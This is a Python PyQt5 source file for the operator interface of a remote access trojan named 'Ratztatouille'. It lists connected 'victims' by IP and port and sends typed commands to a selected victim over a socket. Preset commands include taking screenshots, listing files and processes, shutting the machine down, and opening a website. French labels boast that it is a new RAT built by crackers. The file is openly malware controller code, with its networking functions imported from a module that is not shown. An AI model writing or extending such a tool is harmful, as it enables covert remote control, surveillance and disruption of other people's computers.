from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import *
from ratFunctions import *
import sys

# GUI for the RAT
class App(QMainWindow):
    def __init__(self):
        super().__init__()
        self.title = 'Ratztatouille'
        self.left = 10
        self.top = 10
        self.width = 400
        self.height = 140
        self.initUI()


    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)
 
        # Image
        self.label = QLabel(self)
        self.pixmap = QPixmap('image.png')
        self.label.setPixmap(self.pixmap)
        self.label.move(600,0)
        self.label.resize(188,209)

        # Tool's name
        self.name = QLabel("Ratztatouille", self)
        self.name.move(645, 205)

        # Single Line Editbox
        self.textbox = QLineEdit(self)
        self.textbox.resize(280,50)
        self.textbox.move(550, 250)

        # Command button
        self.button = QPushButton('Launch command', self)
        self.button.resize(280,50)
        self.button.move(550, 320)

        # Refresh button
        self.refresh = QPushButton('Refresh victims', self)
        self.refresh.resize(280,50)
        self.refresh.move(180, 320)

        # Text display
        self.b = QPlainTextEdit(self)
        self.b.setReadOnly(True)
        self.b.resize(1000,300)
        self.b.move(180,400)

        # Label trop lol mdr
        self.nice = QLabel("RAT dernière génération créer par des crackers trop chaud !", self)
        self.nice.resize(400, 20)
        self.nice.move(540, 720)

        # List of commands
        self.listCmds = QtWidgets.QListWidget()
        self.listCmds.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.listCmds.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.listCmds.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        scenario_titles = ["ls", "Screenshot", "ipconfig", "Tasks list", "Shutdown", "Driver Query", "Lancer futurhacker.fr"]
        self.listCmds.addItems(scenario_titles)
        self.listCmds.setFixedSize(max(self.listCmds.sizeHintForColumn(0) + 2 * self.listCmds.frameWidth(), 280),
        self.listCmds.sizeHintForRow(0) * self.listCmds.count() + 2 * self.listCmds.frameWidth())
        self.listCmds.move(900, 50)
        self.layout().addWidget(self.listCmds)

        # List of victims
        self.list = QtWidgets.QListWidget()
        self.list.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.list.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.list.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        victimlist = ["","","","",""]
        self.list.addItems(victimlist)
        self.list.setFixedSize(max(self.list.sizeHintForColumn(0) + 2 * self.list.frameWidth(), 280),
        self.list.sizeHintForRow(0) * self.list.count() + 2 * self.list.frameWidth())
        self.list.move(180, 50)
        self.layout().addWidget(self.list)

        # Event listening for a clicks
        self.button.clicked.connect(self.on_click)
        self.refresh.clicked.connect(self.refreshvictims)
        self.list.clicked.connect(lambda: self.listIp(self.list.currentItem().text()))
        self.listCmds.clicked.connect(lambda: self.commands(self.listCmds.currentItem().text()))
        self.textbox.returnPressed.connect(self.on_click)

        # Display
        self.show()

    # List of IPs
    @pyqtSlot()
    def listIp(self, name):
        global currentip
        currentip = ""
        if name:
            self.b.appendPlainText(f"{name} -> Victime selectionnée")
            currentip = name

    # Execute the command
    @pyqtSlot()
    def on_click(self):
        textboxValue = self.textbox.text()
        if textboxValue:
            print(currentip)
            client = int(currentip[1])
            print(f"Execute : {textboxValue}")
            self.textbox.setText("")
            self.b.appendPlainText(f"Execute : {textboxValue}")
            print("value : ", textboxValue)
            result = SendClientGraph(sockslist[client][0], textboxValue)
            print(result)
            self.b.appendPlainText(f"\n{result}")


    @pyqtSlot()
    def refreshvictims(self):
        victimes = []
        n = 0
        for client in sockslist:
            ip, port = client[0].getpeername()
            victimes.append(f"[{n}] {ip}:{port}")
            n += 1
        self.list.clear()
        self.list.addItems(victimes)
        self.list.repaint()
        self.list.update()


    @pyqtSlot()
    def commands(self, cmd):
        cmdDic = {
            "ls": "dir",
            "Screenshot": "screen",
            "ipconfig": "ipconfig",
            "Tasks list": "ps",
            "Shutdown": "shutdown",
            "Driver Query": "driverquery",
            "Lancer futurhacker.fr": "web"
        }

        self.textbox.setText(cmdDic[cmd])


if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = App()
    sys.exit(app.exec_())
